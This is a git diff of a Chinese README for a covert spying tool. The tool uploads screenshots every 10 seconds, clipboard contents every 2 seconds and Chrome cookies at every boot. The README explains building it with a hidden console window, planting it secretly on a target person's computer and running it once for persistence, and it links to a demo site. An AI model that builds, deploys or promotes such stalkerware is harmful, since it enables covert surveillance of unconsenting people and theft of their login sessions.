@@ -1,6 +1,8 @@
 # 我会一直视奸你
 > 一直、一直、一直
 
+### demo site：[http://amywxd.site:3090](http://amywxd.site:3090)
+
 ## 一款三端的视奸工具
 功能是每10s截一张屏幕上传，每2s上传剪贴板内容，每次开机获取Chrome浏览器cookie并上传。
 
@@ -11,7 +13,7 @@
 - 编译: `go mod tidy`
   - `go build -ldflags="-H=windowsgui"`
   - 命令行参数-H=windowsgui可以隐藏终端       
-- 用(你的办法)[http://amywxd.site:3090]埋好雷把软件放到ta电脑上
+- 用[你的办法](http://amywxd.site:3090)埋好雷把软件放到ta电脑上
 - git编译时务必同时保存`.bat`和`.vbs`以及`cookie_ext.exe`文件，因为go要内嵌
 - 放行运行一次`monitor-agent.exe`，即可持久化
 
